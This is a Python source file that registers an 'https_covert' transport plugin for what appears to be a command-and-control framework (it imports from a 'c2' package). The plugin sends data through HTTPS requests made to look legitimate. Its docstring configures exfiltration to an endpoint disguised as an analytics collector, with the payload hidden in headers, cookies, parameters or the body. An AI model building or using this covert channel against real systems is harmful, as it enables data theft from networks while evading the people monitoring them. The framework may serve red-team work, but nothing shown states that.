"""
HTTPS covert channel transport — wraps c2/https_covert.py as a transport plugin.

Allows the HTTPS covert channel to be used as ``transport.method: "https_covert"``.

Usage::

    # config.yaml
    transport:
      method: "https_covert"
      https_covert:
        endpoint: "https://analytics.example.com/collect"
        method: "header"  # header | cookie | param | body
        shared_key: "hex-encoded-32-byte-key"
"""
from __future__ import annotations

import logging
from typing import Any

from transport import register_transport
from transport.base import BaseTransport

logger = logging.getLogger(__name__)


@register_transport("https_covert")
class HTTPSCovertTransport(BaseTransport):
    """Transport that hides data in legitimate-looking HTTPS requests."""

    def __init__(self, config: dict[str, Any]) -> None:
        super().__init__(config)
        self._config = config
        self._channel = None

    def connect(self) -> None:
        """Connect the HTTPS covert channel transport.

        Raises on failure, matching ``BaseTransport.connect() -> None``.
        """
        from c2.https_covert import HTTPSCovertChannel
        self._channel = HTTPSCovertChannel(self._config)
        self._connected = True

    def disconnect(self) -> None:
        self._channel = None
        self._connected = False

    def send(self, data: bytes, metadata: dict[str, Any] | None = None) -> bool:
        if self._channel is None:
            try:
                self.connect()
            except Exception as exc:
                logger.debug("HTTPS covert auto-connect failed: %s", exc)
                return False

        try:
            data_type = (metadata or {}).get("content_type", "application/octet-stream")
            return self._channel.send_data(data, data_type=data_type)
        except Exception as exc:
            logger.debug("HTTPS covert send failed: %s", exc)
            return False
